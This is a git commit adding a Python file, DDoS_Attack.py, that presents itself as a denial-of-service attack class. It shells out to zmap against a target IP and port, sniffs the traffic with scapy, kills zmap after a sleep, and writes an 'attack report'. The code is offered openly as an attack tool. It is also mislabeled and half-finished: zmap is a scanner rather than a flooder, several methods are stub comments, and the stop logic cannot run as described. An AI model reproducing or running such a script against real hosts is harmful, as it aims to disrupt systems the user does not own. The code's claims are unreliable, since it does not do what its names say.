67a17ee55e259426614dbb86a3221885f135f48b
Ghostintheshell <111326458+Ghostintheshell-iuseArchbtw@users.noreply.github.com>
2023-12-21 01:02:10 +0000

    Update DDoS_Attack.py

---
+++ DDoS_Attack.py
@@ -0,0 +1,45 @@
+import subprocess
+import time
+from scapy.all import sniff  # Add missing import statement
+
+class DDoS_Attack:
+    def __init__(self, target_ip, target_port):
+        self.target_ip = target_ip
+        self.target_port = target_port
+
+    def start_attack(self):
+        # Implement the logic to start the DDoS attack using zmap
+        command = f"zmap -p {self.target_port} {self.target_ip}"
+        subprocess.run(command, shell=True)
+
+    def stop_attack(self):
+        # Implement the logic to stop the DDoS attack
+        time.sleep(300)  # Stop the attack after 5 minutes
+        # Add code to stop the attack here
+        subprocess.run("pkill zmap", shell=True)
+    def analyze_traffic(self):
+        # Implement the logic to analyze the traffic during the attack
+        packets = sniff(filter=f"host {self.target_ip} and port {self.target_port}", count=100)
+        # Process the captured packets here
+        for packet in packets:
+            # Analyze the packet and extract relevant information
+            # Example: print packet summary
+            print(packet.summary())
+
+    def report_results(self):
+        # Implement the logic to generate a report with the attack results
+        with open("attack_report.txt", "w") as file:
+            file.write("DDoS Attack Report\n")
+            file.write(f"Target IP: {self.target_ip}\n")
+            file.write(f"Target Port: {self.target_port}\n")
+            file.write("Attack Results:\n")
+            # Add code to retrieve and write attack results to the file
+            file.write("Report generated successfully.")
+
+# Example usage:
+if __name__ == "__main__":
+    attack = DDoS_Attack("192.168.0.1", 80)
+    attack.start_attack()
+    attack.analyze_traffic()
+    attack.stop_attack()
+    attack.report_results()
